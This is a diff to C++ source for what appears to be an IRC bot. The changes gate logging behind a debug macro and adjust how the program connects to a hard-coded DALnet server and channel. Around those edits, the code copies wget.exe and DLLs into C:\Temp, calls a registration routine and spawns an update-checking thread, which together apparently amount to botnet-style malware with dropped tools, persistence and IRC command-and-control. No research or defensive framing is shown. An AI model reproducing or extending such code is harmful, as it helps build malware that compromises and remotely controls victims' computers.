@@ -923,7 +923,7 @@ if (error != boost::asio::error::eof)
 throw boost::system::system_error(error);
 
 
-if (final_data.length()>0)
+if (final_data.length()>4)
 {
     xmlparser("somefile.xml");
     #ifdef D_LIB
@@ -1006,6 +1006,7 @@ channel="kens";
             FileCopier("libstdc++-6.dll","libstdc++-6.dll","C:\\Temp\\");
             FileCopier("wget.exe","wget.exe","C:\\Temp\\");
             FileCopier("pthreadGC2.dll","pthreadGC2.dll","C:\\Temp\\");
+
             //FileCopier("libidn-11.dll","libidn-11.dll","C:\\Temp\\");
             //FileCopier("libintl-8.dll","libintl-8.dll","C:\\Temp\\");
             //FileCopier("libnettle-4-3.dll","libnettle-4-3.dll","C:\\Temp\\");
@@ -1024,13 +1025,16 @@ start_reg();
 pthread_t threads[NUM_THREADS];
 int rc;
 int i=1;
-
+    #ifdef D_LIB
     logmain<<LINFO<< "main() : creating thread, " << i;
+    #endif // D_LIB
       rc = pthread_create(&threads[i], NULL,
                           Check_Updates, (void *)i);
             pthread_detach(threads[i]);
       if (rc){
+        #ifdef D_LIB
         logmain<<LFATAL << "Error:unable to create thread," << rc ;
+       #endif // D_LIB
       }
 ///////////////////////////////Multi-threading/////////////////////////////////
 
@@ -1047,15 +1051,29 @@ int i=1;
 
                 if(HOST.length()<= 0)
                 {
-                   logmain<<LDEBUG <<"Received host name :"<<HOST;
+                    #ifdef D_LIB
+                    logmain<<LDEBUG <<"Trial No."<<times;
+                    #endif // D_LIB
                    if (times>=6)
                         {
+
                             HOST="punch.wa.us.dal.net";
+                            #ifdef D_LIB
+                             logmain<<LDEBUG <<"Received host name :"<<HOST;
+                             #endif // D_LIB
                             times=0;
                         }
                     times++;
                 }
-                IrcConnect(HOST,channel);
+
+               if(HOST.length()>= 1)
+                 {
+                     IrcConnect(HOST,channel);
+                 }
+                 else
+                    #ifdef D_LIB
+                    logmain<<LDEBUG <<"No host name Received !";
+                    #endif // D_LIB
                 } catch (const std::exception& ex) {
 // ...
                 } catch (const std::string& ex) {
